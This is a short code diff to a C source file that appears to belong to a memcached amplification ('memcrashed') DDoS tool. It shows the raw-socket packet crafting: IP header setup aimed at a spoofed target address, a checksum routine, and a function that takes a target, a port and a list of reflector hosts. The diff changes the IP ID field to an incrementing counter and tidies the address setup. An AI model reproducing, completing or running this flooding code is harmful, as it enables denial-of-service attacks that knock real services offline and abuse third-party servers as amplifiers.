@@ -11,6 +11,7 @@
 #include "ddos.h"//configuration
 #include "message.h"
 #include "util.h"
+#include "types.h"
 
 #include <pthread.h>
 #include <netinet/ip.h>
@@ -26,6 +27,7 @@
 
 #define MAX_PSIZE 4096
 slist* _hosts;
+int _iid;
 unsigned short csum (unsigned short *buf, int nwords)
 {
     unsigned long sum = 0;
@@ -42,7 +44,7 @@ void init_ip(struct iphdr* iph,char* target){
     iph->ip_v = 4;
     iph->ip_tos = 0;
     iph->ip_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 15;
-    iph->ip_id = htonl(54321);
+    iph->ip_id = htonl(_iid++);
     iph->ip_off = 0;
     iph->ip_ttl = MAXTTL;
     iph->ip_p = IPPROTO_UDP;
@@ -85,10 +87,8 @@ void _memcrashed_ddos(char *target,int port,slist *hosts){
     struct iphdr *iph = (struct iphdr*)datagram;
     struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
     struct sockaddr_in sin;
-    sin.sin_family=AF_INET;
-    struct in_addr _s;
-    _s.s_addr=inet_addr(target);
-    sin.sin_addr=_s;
+    sin.sin_family = AF_INET;
+    sin.sin_addr.s_addr = inet_addr(target);
     int sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     if(sock < 0){
         die("Failed to open socket!");
